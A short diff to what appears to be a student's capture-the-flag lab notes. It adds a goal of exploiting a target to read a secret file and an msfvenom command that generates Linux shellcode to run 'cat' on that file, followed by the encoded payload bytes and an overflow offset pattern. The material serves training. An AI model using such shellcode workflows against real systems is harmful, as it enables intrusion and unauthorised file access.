@@ -341,6 +341,7 @@ end here-
 =========================================================================
 =========================================================================
 CTFd7
+DEVELOPE EXPLOIT TO READ /.secret/.verysecret.pdb
 
 Scheme of Maneuver:
 >Jump Box
@@ -411,7 +412,7 @@ Press enter to view inventory: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5A
 0xf7f6674b
 0xf7f72753
 
-student@lin-ops:~$ msfvenom -p linux/x86/exec CMD=cat -b '\x00' -f python
+student@lin-ops:~$ msfvenom -p linux/x86/exec CMD="cat /.secret/.verysecret.pdb" -b '\x00' -f python
 buf += b"\xba\x4d\xd5\x81\x94\xda\xca\xd9\x74\x24\xf4\x5b"
 buf += b"\x2b\xc9\xb1\x0a\x31\x53\x15\x83\xc3\x04\x03\x53"
 buf += b"\x11\xe2\xb8\xbf\x8a\xcc\xdb\x12\xeb\x84\xf6\xf1"
